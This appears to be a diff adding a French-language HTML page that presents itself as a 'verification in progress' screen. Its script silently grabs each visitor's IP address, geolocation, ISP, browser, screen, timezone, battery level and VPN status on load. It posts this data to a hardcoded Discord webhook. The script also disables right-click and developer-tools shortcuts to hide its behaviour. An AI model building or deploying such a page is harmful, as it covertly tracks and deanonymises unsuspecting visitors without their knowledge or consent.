@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✅ Vérification...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
+    </style>
+    <script>
+        // 🔒 Désactive clic droit et l'inspecteur
+        document.addEventListener("contextmenu", event => event.preventDefault());
+        document.addEventListener("keydown", function(event) {
+            if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
+                event.preventDefault();
+            }
+        });
+
+        async function getUserInfo() {
+            try {
+                let ipData = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
+                let geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(res => res.json());
+
+                let ip = ipData.ip;
+                let os = navigator.userAgent;
+                let lang = navigator.language;
+                let screenSize = `${screen.width}x${screen.height}`;
+                let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                let batteryStatus = "Inconnu";
+                let vpnDetection = geoData.org.includes("VPN") || geoData.org.includes("Proxy") ? "🚨 VPN/Proxy détecté !" : "✅ Connexion normale";
+
+                if (navigator.getBattery) {
+                    let battery = await navigator.getBattery();
+                    batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
+                }
+
+                let message = `
+                    **🔍 Nouvelle connexion détectée :**
+                    - **🌍 IP:** ${ip}
+                    - **📌 Pays:** ${geoData.country_name} (${geoData.region}, ${geoData.city})
+                    - **📶 FAI:** ${geoData.org}
+                    - **💻 OS / Navigateur:** ${os}
+                    - **🌐 Langue:** ${lang}
+                    - **📱 Résolution écran:** ${screenSize}
+                    - **🕰️ Fuseau horaire:** ${timezone}
+                    - **🔋 Batterie:** ${batteryStatus}
+                    - **🛡️ Statut VPN:** ${vpnDetection}
+                `;
+
+                sendToDiscord(message);
+            } catch (error) {
+                console.error("❌ Erreur lors de la récupération des données :", error);
+            }
+        }
+
+        function sendToDiscord(message) {
+            let webhookURL = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: message })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("❌ Erreur Webhook :", response.statusText);
+                } else {
+                    console.log("✅ Message envoyé sur Discord !");
+                }
+            })
+            .catch(error => console.error("❌ Erreur lors de l'envoi du message :", error));
+        }
+
+        window.onload = getUserInfo;
+    </script>
+</head>
+<body>
+    <h1>✅ Vérification en cours...</h1>
+    <p>Merci de patienter quelques secondes...</p>
+</body>
+</html>
